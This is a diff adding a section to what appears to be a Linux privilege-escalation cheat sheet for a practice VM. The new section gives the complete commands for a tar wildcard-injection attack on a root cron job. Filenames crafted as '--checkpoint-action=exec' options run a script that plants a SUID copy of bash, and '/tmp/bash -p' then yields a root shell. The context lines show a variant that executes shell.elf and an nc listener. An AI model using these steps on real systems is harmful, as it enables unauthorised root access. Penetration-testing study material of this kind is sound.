@@ -472,6 +472,18 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 ````
 nc -nvlp 4444
 ````
+#### CronJobs - Wildcards No msfvenom
+````
+echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > /home/user/runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+````
+- Wait the 1 minute or time defined by cron settings
+- Once the cronjob hits run:
+````
+/tmp/bash -p
+id
+````
 ### SUID and SGID Executables --GTFO Bins
 - Find all the SUID/SGID executables on the Debian VM:
 ````
